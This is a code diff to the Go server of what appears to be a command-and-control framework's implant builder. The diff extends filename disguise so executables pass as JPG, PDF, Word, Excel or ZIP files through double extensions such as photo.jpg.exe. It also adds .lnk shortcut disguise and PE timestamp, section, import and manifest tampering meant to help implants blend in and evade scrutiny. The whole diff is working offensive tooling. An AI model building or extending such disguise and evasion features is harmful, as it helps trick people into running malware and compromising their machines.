@@ -1,7 +1,9 @@
 package server
 
 import (
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"net/http"
 	"os"
@@ -13,6 +15,17 @@ import (
 	"github.com/gin-gonic/gin"
 	"golang.org/x/crypto/ssh"
 )
+
+// profileAuditHash fingerprints the effective malleable shape for build audit.
+func profileAuditHash(cfg payload.ImplantConfig) string {
+	h := sha256.New()
+	fmt.Fprintf(h, "%s|%s|%s|%s|%s|%s|%s|%s",
+		cfg.BeaconURI, cfg.Method, cfg.UserAgent,
+		cfg.MalleablePrepend, cfg.MalleableAppend,
+		cfg.MalleableServerOutput, cfg.MalleableClientMetadata, cfg.MalleableClientID)
+	sum := h.Sum(nil)
+	return hex.EncodeToString(sum)[:12]
+}
 
 type binaryGenForm struct {
 	C2URL            string `form:"c2_url"`
@@ -60,6 +73,11 @@ type binaryGenForm struct {
 	FileDescription     string `form:"file_description"`
 	CompanyName         string `form:"company_name"`
 	DisguiseAs          string `form:"disguise_as"`
+	LNKDisguise         string `form:"lnk_disguise"` // "true" to generate .lnk alongside
+	PETimestampMode     string `form:"pe_timestamp"`
+	PESectionMode       string `form:"pe_sections"`
+	PEImportMode        string `form:"pe_imports"`
+	PEManifestMode      string `form:"pe_manifest"`
 }
 
 // parseBinaryForm validates a binary generation request and returns the resolved form.
@@ -142,16 +160,33 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 
 	// Handle JPG disguise: if disguise_as=jpg, ensure filename looks like a JPG
 	// (e.g. photo.jpg.exe). This is the user-visible social-engineering layer;
-	// the icon layer is handled in payload.GenerateWindowsEXE.
-	if form.DisguiseAs == "jpg" && form.Filename != "" {
+	// Filename disguise - support jpg/pdf/doc/xls/zip
+	disguiseLower := strings.ToLower(form.DisguiseAs)
+	disguiseExt := ""
+	switch disguiseLower {
+	case "jpg", "jpeg":
+		disguiseExt = ".jpg"
+	case "pdf":
+		disguiseExt = ".pdf"
+	case "doc", "word", "docx":
+		disguiseExt = ".docx"
+	case "xls", "xlsx":
+		disguiseExt = ".xlsx"
+	case "zip":
+		disguiseExt = ".zip"
+	}
+	if disguiseExt != "" && form.Filename != "" {
 		lower := strings.ToLower(form.Filename)
-		if !strings.Contains(lower, ".jpg") {
-			// Strip existing .exe and append .jpg.exe
+		if !strings.Contains(lower, disguiseExt) {
 			base := strings.TrimSuffix(form.Filename, ".exe")
 			base = strings.TrimSuffix(base, ".EXE")
-			base = strings.TrimSuffix(base, ".jpg")
-			base = strings.TrimSuffix(base, ".JPG")
-			form.Filename = base + ".jpg.exe"
+			for _, ext := range []string{".jpg", ".jpeg", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".zip"} {
+				if strings.HasSuffix(strings.ToLower(base), ext) {
+					base = base[:len(base)-len(ext)]
+					break
+				}
+			}
+			form.Filename = base + disguiseExt + ".exe"
 		}
 	}
 	// Validate icon payload (≤350KB base64 ≈ 256KB raw)
@@ -165,9 +200,42 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 			return nil, false
 		}
 	}
-	// Restrict disguise_as to known values
-	if form.DisguiseAs != "" && form.DisguiseAs != "jpg" && form.DisguiseAs != "pdf" {
+	// Restrict disguise_as to known values (jpg/pdf/doc/xls/zip/folder/chrome/word)
+	allowedDisguise := map[string]bool{"jpg": true, "jpeg": true, "pdf": true, "doc": true, "docx": true, "word": true, "xls": true, "xlsx": true, "zip": true, "folder": true, "chrome": true}
+	if form.DisguiseAs != "" && !allowedDisguise[strings.ToLower(form.DisguiseAs)] {
 		form.DisguiseAs = ""
+	} else {
+		form.DisguiseAs = strings.ToLower(form.DisguiseAs)
+		// normalize aliases
+		if form.DisguiseAs == "jpeg" {
+			form.DisguiseAs = "jpg"
+		}
+		if form.DisguiseAs == "docx" {
+			form.DisguiseAs = "doc"
+		}
+		if form.DisguiseAs == "xlsx" {
+			form.DisguiseAs = "xls"
+		}
+		if form.DisguiseAs == "word" {
+			form.DisguiseAs = "doc"
+		}
+	}
+	// Normalize PE options
+	form.PETimestampMode = strings.ToLower(strings.TrimSpace(form.PETimestampMode))
+	if form.PETimestampMode != "random" && form.PETimestampMode != "keep" {
+		form.PETimestampMode = "zero"
+	}
+	form.PESectionMode = strings.ToLower(strings.TrimSpace(form.PESectionMode))
+	if form.PESectionMode != "random" {
+		form.PESectionMode = "default"
+	}
+	form.PEImportMode = strings.ToLower(strings.TrimSpace(form.PEImportMode))
+	if form.PEImportMode != "kernel32+user32" && form.PEImportMode != "kernel32" {
+		form.PEImportMode = "none"
+	}
+	form.PEManifestMode = strings.ToLower(strings.TrimSpace(form.PEManifestMode))
+	if form.PEManifestMode != "blend" {
+		form.PEManifestMode = "default"
 	}
 
 	// Prefix filename with short UUID to prevent concurrent build collisions.
@@ -237,6 +305,14 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 	// instead generate a unique 32-byte registration secret, persist it sealed
 	// server-side, and embed ONLY that secret (plus its public id) in the
 	// binary. Extracting one payload then yields no other agent's keys.
+	// Working-hours default: carried explicitly so NormalizeImplantConfig can
+	// apply the documented precedence explicit form > profile > server
+	// default. Previously the server default was parsed and saved but never
+	// wired into builds.
+	s.configMu.RLock()
+	defWorkStart, defWorkEnd, defWorkTZ := s.cfg.Implant.DefaultWorkingStart, s.cfg.Implant.DefaultWorkingEnd, s.cfg.Implant.DefaultWorkingTZ
+	s.configMu.RUnlock()
+
 	var err error
 	var regSecretID, regSecretB64 string
 	regSecretID, regSecretB64, beaconKey, err = s.ensureV3RegSecret(beaconKey)
@@ -279,6 +355,9 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 		WorkingStart:          form.WorkingStart,
 		WorkingEnd:            form.WorkingEnd,
 		WorkingTZ:             form.WorkingTZ,
+		DefaultWorkingStart:   defWorkStart,
+		DefaultWorkingEnd:     defWorkEnd,
+		DefaultWorkingTZ:      defWorkTZ,
 		NetworkConfigOverWire: form.NetCfgOverWire,
 		SSHUser:               form.SSHUser,
 		SSHPassword:           form.SSHPassword,
@@ -294,6 +373,11 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 		FileDescription:       form.FileDescription,
 		CompanyName:           form.CompanyName,
 		DisguiseAs:            form.DisguiseAs,
+		LNKDisguise:           form.LNKDisguise == "true" || form.LNKDisguise == "1",
+		PETimestampMode:       form.PETimestampMode,
+		PESectionMode:         form.PESectionMode,
+		PEImportMode:          form.PEImportMode,
+		PEManifestMode:        form.PEManifestMode,
 	}, nil
 }
 
@@ -348,7 +432,7 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 		return
 	}
 	agentsDir := s.extractAgentsDir()
-	job := s.startBuildJob("windows", "exe", form.C2URL, form.ListenerID, form.Filename)
+	job := s.startBuildJobWithProfile("windows", "exe", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg))
 
 	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateWindowsEXE(cfg, agentsDir)
@@ -375,7 +459,7 @@ func (s *Server) handleGenerateDLL(c *gin.Context) {
 		return
 	}
 	agentsDir := s.extractAgentsDir()
-	job := s.startBuildJob("windows", "dll", form.C2URL, form.ListenerID, form.Filename)
+	job := s.startBuildJobWithProfile("windows", "dll", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg))
 
 	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateWindowsDLL(cfg, agentsDir)
@@ -402,7 +486,7 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 		return
 	}
 	agentsDir := s.extractAgentsDir()
-	job := s.startBuildJob("linux", "elf", form.C2URL, form.ListenerID, form.Filename)
+	job := s.startBuildJobWithProfile("linux", "elf", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg))
 
 	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateLinuxELF(cfg, agentsDir)
@@ -429,7 +513,7 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 		return
 	}
 	agentsDir := s.extractAgentsDir()
-	job := s.startBuildJob("macos", "binary", form.C2URL, form.ListenerID, form.Filename)
+	job := s.startBuildJobWithProfile("macos", "binary", form.C2URL, form.ListenerID, form.Filename, form.Profile, profileAuditHash(cfg))
 
 	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateMacOS(cfg, agentsDir)
